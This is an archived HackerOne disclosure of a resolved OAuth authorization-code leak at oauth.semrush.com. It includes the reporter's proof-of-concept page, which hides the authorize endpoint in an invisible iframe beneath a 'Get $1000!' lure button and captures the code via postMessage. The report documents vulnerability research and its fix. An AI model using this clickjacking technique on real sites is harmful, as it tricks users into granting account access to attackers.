---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
date: 2018-04-17
submitted: 2018-02-10T19:34:59.147Z
bounty_usd: null
votes: 70
cve: []
program: "[[programs/semrush|Semrush]]"
reporter: "nikitastupin"
source: "https://hackerone.com/reports/314814"
title: "[oauth token leak] at oauth.semrush.com"
---
# [oauth token leak] at oauth.semrush.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 70 | **Program:** Semrush | **Disclosed:** 2018-04-17

- Report: [https://hackerone.com/reports/314814](https://hackerone.com/reports/314814)
- CWE: Improper Authentication - Generic
- Submitted: 2018-02-10T19:34:59.147Z

## Timeline

- **Report Filed**
- **2018-02-10** @nikitastupin: I've written new exploit which increases a probability of victim to click (note: that exploit uses fact that there is no `X-Frame-Options` header at `oauth.semrush.com`:
```
<button style="position:absolute;bottom:140px;right:530px;height:30px;width:70px;background-color:red" frameBorder="0">Get $1000!</button>
<iframe name="theFrame" style="width:100%;height:100%;opacity:0;overflow: hidden;"></iframe>
<script>

  function listener(event) {
    alert(JSON.stringify(event.data));
  }

  var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962", "theFrame");
  
  window.addEventListener("message", listener);
  console.log(window.elementFromPoint(869, 656));
</script>
```
1) Victim goes to `attacker.com/postmessage.html` and sees  F262227
2) Victim clicks on button to get $1000 but in fact clicks on "Approve"
3) Attacker gets `code`  F262226
- **2018-02-12** @alla: Thanks for the report, we will investigate this.
- **Report Triaged**
- **2018-02-21** @nikitastupin: Any updates?
- **2018-02-22** @alla: We'll inform you about any updates. Thank you for your patience.
- **Bounty Awarded**
- **2018-02-28** @nikitastupin: Hi,
Thanks for bounty! Looking for more vulnerabilities!

Is this bounty for oauth token leak only or for oauth token leak plus clickjacking?
- **2018-03-17** @alla: Could you please check the fix?
- **2018-03-18** @nikitastupin: It's fixed.

What about my question above?
- **Report Resolved**
- **2018-03-18** @alla: We'll answer very soon. Thank you for your patience.
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
